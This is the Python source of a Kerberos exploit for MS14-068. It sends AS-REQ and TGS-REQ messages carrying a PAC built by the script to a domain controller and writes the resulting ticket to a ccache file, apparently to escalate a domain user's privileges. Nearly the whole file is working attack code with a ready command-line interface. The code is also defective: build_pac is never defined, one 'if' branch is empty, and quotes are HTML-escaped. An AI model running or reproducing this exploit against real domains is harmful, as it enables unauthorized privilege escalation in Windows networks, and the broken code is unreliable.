 
# MS14-068 Exploit
 
# Author
# ------
# Sylvain Monne
# Contact : sylvain dot monne at solucom dot fr
# http://twitter.com/bidord
 
 
 
import sys, os
from random import getrandbits
from time import time, localtime, strftime
 
from kek.ccache import CCache, get_tgt_cred, kdc_rep2ccache
from kek.crypto import generate_subkey, ntlm_hash, RC4_HMAC, HMAC_MD5
from kek.krb5 import build_as_req, build_tgs_req, send_req, recv_rep, \
    decrypt_as_rep, decrypt_tgs_rep, decrypt_ticket_enc_part, iter_authorization_data, \
    AD_WIN2K_PAC
from kek.util import epoch2gt, gt2epoch
 
 
def sploit(user_realm, user_name, user_sid, user_key, kdc_a, kdc_b, target_realm, target_service, target_host,
           output_filename, krbtgt_a_key=None, trust_ab_key=None, target_key=None):
 
    sys.stderr.write(&#039;  [+] Building AS-REQ for %s...&#039; % kdc_a)
    sys.stderr.flush()
    nonce = getrandbits(31)
    current_time = time()
    as_req = build_as_req(user_realm, user_name, user_key, current_time, nonce, pac_request=False)
    sys.stderr.write(&#039; Done!\n&#039;)
     
    sys.stderr.write(&#039;  [+] Sending AS-REQ to %s...&#039; % kdc_a)
    sys.stderr.flush()
    sock = send_req(as_req, kdc_a)
    sys.stderr.write(&#039; Done!\n&#039;)
 
    sys.stderr.write(&#039;  [+] Receiving AS-REP from %s...&#039; % kdc_a)
    sys.stderr.flush()
    data = recv_rep(sock)
    sys.stderr.write(&#039; Done!\n&#039;)
 
    sys.stderr.write(&#039;  [+] Parsing AS-REP from %s...&#039; % kdc_a)
    sys.stderr.flush()
    as_rep, as_rep_enc = decrypt_as_rep(data, user_key)
    session_key = (int(as_rep_enc[&#039;key&#039;][&#039;keytype&#039;]), str(as_rep_enc[&#039;key&#039;][&#039;keyvalue&#039;]))
    logon_time = gt2epoch(str(as_rep_enc[&#039;authtime&#039;]))
    tgt_a = as_rep[&#039;ticket&#039;]
    sys.stderr.write(&#039; Done!\n&#039;)
 
 
    if krbtgt_a_key is not None:
        ticket_debug(tgt_a, krbtgt_a_key)
     
    sys.stderr.write(&#039;  [+] Building TGS-REQ for %s...&#039; % kdc_a)
    sys.stderr.flush()
    subkey = generate_subkey()
    nonce = getrandbits(31)
    current_time = time()
    pac = (AD_WIN2K_PAC, build_pac(user_realm, user_name, user_sid, logon_time))
    tgs_req = build_tgs_req(user_realm, &#039;krbtgt&#039;, target_realm, user_realm, user_name,
                            tgt_a, session_key, subkey, nonce, current_time, pac, pac_request=False)
    sys.stderr.write(&#039; Done!\n&#039;)
 
    sys.stderr.write(&#039;  [+] Sending TGS-REQ to %s...&#039; % kdc_a)
    sys.stderr.flush()
    sock = send_req(tgs_req, kdc_a)
    sys.stderr.write(&#039; Done!\n&#039;)
 
    sys.stderr.write(&#039;  [+] Receiving TGS-REP from %s...&#039; % kdc_a)
    sys.stderr.flush()
    data = recv_rep(sock)
    sys.stderr.write(&#039; Done!\n&#039;)
 
    sys.stderr.write(&#039;  [+] Parsing TGS-REP from %s...&#039; % kdc_a)
    tgs_rep, tgs_rep_enc = decrypt_tgs_rep(data, subkey)
    session_key2 = (int(tgs_rep_enc[&#039;key&#039;][&#039;keytype&#039;]), str(tgs_rep_enc[&#039;key&#039;][&#039;keyvalue&#039;]))
    tgt_b = tgs_rep[&#039;ticket&#039;]
    sys.stderr.write(&#039; Done!\n&#039;)
 
 
    if trust_ab_key is not None:
        ticket_debug(tgt_b, trust_ab_key)
 
 
    if target_service is not None and target_host is not None and kdc_b is not None:
        sys.stderr.write(&#039;  [+] Building TGS-REQ for %s...&#039; % kdc_b)
        sys.stderr.flush()
        subkey = generate_subkey()
        nonce = getrandbits(31)
        current_time = time()
        tgs_req2 = build_tgs_req(target_realm, target_service, target_host, user_realm, user_name,
                                tgt_b, session_key2, subkey, nonce, current_time)
        sys.stderr.write(&#039; Done!\n&#039;)
 
        sys.stderr.write(&#039;  [+] Sending TGS-REQ to %s...&#039; % kdc_b)
        sys.stderr.flush()
        sock = send_req(tgs_req2, kdc_b)
        sys.stderr.write(&#039; Done!\n&#039;)
 
        sys.stderr.write(&#039;  [+] Receiving TGS-REP from %s...&#039; % kdc_b)
        sys.stderr.flush()
        data = recv_rep(sock)
        sys.stderr.write(&#039; Done!\n&#039;)
 
        sys.stderr.write(&#039;  [+] Parsing TGS-REP from %s...&#039; % kdc_b)
        tgs_rep2, tgs_rep_enc2 = decrypt_tgs_rep(data, subkey)
        sys.stderr.write(&#039; Done!\n&#039;)
 
    else:
        tgs_rep2 = tgs_rep
        tgs_rep_enc2 = tgs_rep_enc
 
    sys.stderr.write(&#039;  [+] Creating ccache file %r...&#039; % output_filename)
    cc = CCache((user_realm, user_name))
    tgs_cred = kdc_rep2ccache(tgs_rep2, tgs_rep_enc2)
    cc.add_credential(tgs_cred)
    cc.save(output_filename)
    sys.stderr.write(&#039; Done!\n&#039;)
 
 
    if target_key is not None:
        ticket_debug(tgs_rep2[&#039;ticket&#039;], target_key)
 
 
# Pretty print full ticket content
# Only possible in a lab environment when you already know krbtgt and/or service keys
def ticket_debug(ticket, key):
    try:
        ticket_enc = decrypt_ticket_enc_part(ticket, key)
        for ad in iter_authorization_data(ticket_enc[&#039;authorization-data&#039;]):
            print >> sys.stderr, &#039;AUTHORIZATION-DATA (type: %d):&#039; % ad[&#039;ad-type&#039;]
            if ad[&#039;ad-type&#039;] == AD_WIN2K_PAC:
            else:
                print >> sys.stderr, str(ad[&#039;ad-data&#039;]).encode(&#039;hex&#039;)
    except Exception as e:
        print &#039;ERROR:&#039;, e
 
 
if __name__ == &#039;__main__&#039;:
    from getopt import getopt
    from getpass import getpass
 
    def usage_and_exit():
        print >> sys.stderr, &#039;USAGE:&#039;
        print >> sys.stderr, &#039;%s -u <userName>@<domainName> -s <userSid> -d <domainControlerAddr>&#039; % sys.argv[0]
        print >> sys.stderr, &#039;&#039;
        print >> sys.stderr, &#039;OPTIONS:&#039;
        print >> sys.stderr, &#039;    -p <clearPassword>&#039;
        print >> sys.stderr, &#039; --rc4 <ntlmHash>&#039;
        sys.exit(1)
 
    opts, args = getopt(sys.argv[1:], &#039;u:s:d:p:&#039;, [&#039;rc4=&#039;])
    opts = dict(opts)
    if not all(k in opts for k in (&#039;-u&#039;, &#039;-s&#039;, &#039;-d&#039;)):
        usage_and_exit()
 
    user_name, user_realm = opts[&#039;-u&#039;].split(&#039;@&#039;, 1)
    user_sid = opts[&#039;-s&#039;]
    kdc_a = opts[&#039;-d&#039;]
 
    if &#039;--rc4&#039; in opts:
        user_key = (RC4_HMAC, opts[&#039;--rc4&#039;].decode(&#039;hex&#039;))
        assert len(user_key[1]) == 16
    elif &#039;-p&#039; in opts:
        user_key = (RC4_HMAC, ntlm_hash(opts[&#039;-p&#039;]).digest())
    else:
        user_key = (RC4_HMAC, ntlm_hash(getpass(&#039;Password: &#039;)).digest())
 
    target_realm = user_realm
    target_service = target_host = kdc_b = None
    filename = &#039;TGT_%s@%s.ccache&#039; % (user_name, user_realm)
 
    user_realm = user_realm.upper()
    target_realm = target_realm.upper()
 
    sploit(user_realm, user_name, user_sid, user_key, kdc_a, kdc_b, target_realm, target_service, target_host, filename)

